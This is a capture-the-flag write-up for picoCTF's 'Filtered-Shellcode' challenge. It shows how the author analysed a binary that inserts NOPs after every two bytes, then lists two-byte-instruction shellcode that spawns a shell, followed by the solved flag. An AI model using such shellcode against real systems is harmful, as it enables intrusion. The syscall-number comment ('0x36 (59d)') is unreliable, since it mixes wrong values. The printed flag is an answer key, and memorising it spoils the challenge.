# Filtered-Shellcode

## Introduction

> A program that just runs the code you give it? That seems kinda boring.

The author of the program is MADSTACKS for picoCTF. We are given the following:

`fun` - i386 32-bit executable.
`nc mercury.picoctf.net 28494` - The address and port of the remote server.

## Information Gathering

### Hint #1

> Take a look at the calling convention and see how you might be able to setup
all the registers.

We know that i386 has a calling convention that passes input to functions via
the stack. I think what this hint is referring to is that when we call a
syscall, we first need to setup the registers to pass the input. Assuming our
goal is to pop a shell and then cat the flag, our registers should look like
this:

```txt
$eax: syscall NR        /* sycall for execve -> 0x36 (59d) */
$ebx: first argument    /* *filename         -> /bin/sh */
$ecx: second argument   /* *argv[]           -> 0       */
$edx: third argument    /* *envp[]           -> junk    */
```

### Static

We decompiled the program with Ghidra. The program takes up to 1000 bytes,
transforms them in some manner, and then executes the code inside the function
`execute`. It appears to place two `nop` instructions (`\x90`) between every
two bytes of input we give it. It looks like a pain to reverse so let's see if
some dynamic analysis can help us.

### Dynamic

Examining the program with GDB (br \* 0x080486a3 and br \* 0x080485c9), the
following input got transformed as such:

"abcdefghijklmnopqrstuvwxyz" ->
"ab\x90\x90cd\x90\x90ef\x90\x90gh\x90\x90ij\x90\x90kl\x90\x90mn\x90\x90op\x90
\x90qr\x90\x90st\x90\x90uv\x90\x90wx\x90\x90yz"

The latter bytes are the ones that we will be directly executing. If this
transform pattern holds for all 1000 bytes that we can input it means that
we'll be limited to two character opcodes. Before making life complicated,
let's test this out with the function `test_pattern` inside our solution. The
Python GDB API is awesome and really poorly documented at the same time. Using
the API probably took longer to figure out than creating the shellcode did.
Indeed, we found that the pattern continued throughout the entire input.

## Strategy

Alright, so we need to create shellcode that only occupies two bytes at a time.
My mentor @jocular recommending taking a look a the x86 shift instructions and
8-bit registers. It took awhile to nail down what was going on, but the main
idea is to load `/bin/sh` one byte at a time into `$al` and `$ah` and then
shift them into the correct positions inside of `$eax`. Then we can push the
string `/bin/sh` onto the stack and call `execve`. And it works!

```asm
/* Move /sh to $eax. */
xor eax, eax
mov ah, 0x00
mov al, 'h'
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
mov ah, 's'
mov al, '/'

/* Push $eax ('/sh') onto the stack. */
push eax
nop /* Needed to maintain alignment since push $eax is only one byte. */

/* Move /bin to $eax. */
mov ah, 'n'
mov al, 'i'
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
mov ah, 'b'
mov al, '/'

/* Push $eax ('/bin') onto the stack. */
push eax
nop /* Needed to maintain alignment since push $eax is only one byte. */

/* x86 expects arg0 (the file to be executed) to be in $ebx. This should be
** a pointer to the string that should be executed. Our string '/bin/sh'
** resides on the stack so we can simply move $esp into $ebx. */
mov ebx, esp

/* Set up arg1 (the ** argv array). Since there are no arguments, we can
** pass a NULL byte. */
xor ecx, ecx

/* Set up arg2 (the ** envp). Since there are no environment variables, we
** can pass a NULL byte. */
xor edx, edx

/* Move the syscall number for execve into $eax. */
xor eax, eax
mov al, {EXECVE_X86}

/* Call the syscall. */
sysenter
```

## The Solution

You should be able to run the solution like so:

```python
$ python3 ./solve.py REMOTE
[+] The flag is: picoCTF{th4t_w4s_fun_384f7c52706306d0}
[+] Time: 0.15123486518859863
```
